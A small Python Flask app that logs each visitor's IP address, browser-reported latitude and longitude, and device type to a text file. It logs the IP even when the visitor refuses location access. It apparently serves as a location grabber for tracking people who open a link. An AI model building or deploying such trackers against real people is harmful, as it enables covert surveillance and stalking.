from flask import Flask, request, render_template
from datetime import datetime
import re

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.getlist('X-Forwarded-For')[0]
    return request.remote_addr

def get_device_type(user_agent):
    if re.search(r'mobile|android|iphone|ipad|tablet', user_agent, re.IGNORECASE):
        return 'Mobile'
    elif re.search(r'bot|crawl|spider', user_agent, re.IGNORECASE):
        return 'Bot'
    else:
        return 'Desktop'

def get_device_system(user_agent):
    if re.search(r'windows', user_agent, re.IGNORECASE):
        return 'Windows'
    elif re.search(r'macintosh|mac os', user_agent, re.IGNORECASE):
        return 'MacOS'
    elif re.search(r'android', user_agent, re.IGNORECASE):
        return 'Android'
    elif re.search(r'iphone', user_agent, re.IGNORECASE):
        return 'iOS'
    elif re.search(r'linux', user_agent, re.IGNORECASE):
        return 'Linux'
    elif re.search(r'ios', user_agent, re.IGNORECASE):
        return 'iOS'
    else:
        return 'Unknown'

@app.route('/record_ip', methods=['POST'])
def record_ip():
    client_ip = get_client_ip()

    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    data = request.json
    if data.get('locationDenied'):
        with open('result.txt', 'a') as file:
            file.write(f"{current_time} - IP: {client_ip} - Location BLOCKED 🤬 - Device: {get_device_type(data.get('userAgent'))}\n")
        return f"Location access denied by user. IP address {client_ip} recorded at {current_time}."

    latitude = data.get('latitude')
    longitude = data.get('longitude')
    user_agent = data.get('userAgent')

    device_type = get_device_type(user_agent)
    device_system = get_device_system(user_agent)

    with open('result.txt', 'a') as file:
        file.write(f"{current_time} - IP: {client_ip} - Latitude: {latitude}, Longitude: {longitude} - Device: {device_type} - DeviceSystem: {device_system}\n")
    
    return f"IP address {client_ip} recorded at {current_time}. Latitude: {latitude}, Longitude: {longitude}. Device: {device_type}"

if __name__ == '__main__':
    app.run(debug=True)
